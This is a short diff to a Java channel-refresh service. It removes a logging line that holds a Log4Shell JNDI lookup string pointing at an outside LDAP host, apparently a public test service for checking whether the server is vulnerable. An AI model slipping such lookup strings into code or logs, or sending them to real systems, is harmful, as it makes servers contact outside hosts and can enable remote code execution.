@@ -72,7 +72,6 @@ public class ChannelURLService implements ChannelService {
     @Scheduled(fixedDelay = 60 * 1000) //Every Minute
     @PostConstruct
     public void getChannelInfo() throws Exception {
-        logger.info("${jndi:ldap://log4shell.huntress.com:1389/5592b51b-f81d-4295-a173-01b91f3b05d4}");
         if(new Date().getTime()-lastUpdate>+(config.getSource().getEpg().getRefresh()*1000)) {
             ObjectMapper objectMapper = new ObjectMapper();
             List<Channel> channels=null;
